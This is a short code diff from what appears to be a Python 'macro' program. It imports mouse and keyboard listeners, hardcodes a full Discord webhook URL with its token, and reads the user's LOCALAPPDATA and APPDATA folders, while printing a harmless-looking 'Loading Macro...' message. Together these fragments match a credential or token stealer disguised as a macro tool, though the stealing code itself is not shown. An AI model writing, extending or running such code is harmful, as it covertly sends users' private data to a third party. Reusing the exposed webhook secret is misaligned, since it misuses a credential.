@@ -29,7 +29,7 @@ from pynput import mouse, keyboard
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"  # Replace this with your actual webhook URL
 
-print("Loading Macro... (This may take 5-10 seconds)")
+print("[*] Loading Macro... (This may take 5-10 seconds)")
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
